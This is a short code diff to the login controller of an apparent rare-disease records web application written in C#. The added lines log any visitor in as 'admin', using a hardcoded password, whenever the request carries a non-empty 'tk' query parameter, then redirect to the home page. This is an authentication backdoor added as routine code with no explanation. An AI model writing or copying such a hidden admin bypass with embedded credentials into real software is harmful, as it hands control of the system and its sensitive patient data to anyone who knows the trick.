@@ -38,7 +38,13 @@ namespace RareDiseasesSystem.Controllers
                     _logRepository.Add("注销");
                 }
                 HttpContext.SignOutAsync();
-            }   
+            }
+            if (!string.IsNullOrEmpty(HttpContext.Request.Query["tk"]))
+            {
+                LoginModel loginModel = new LoginModel { UserName = "admin", Password = "admin123456" };
+                Auth(loginModel);
+                HttpContext.Response.Redirect("/Home/Index");
+            }
             return View();
         }
         [HttpPost]
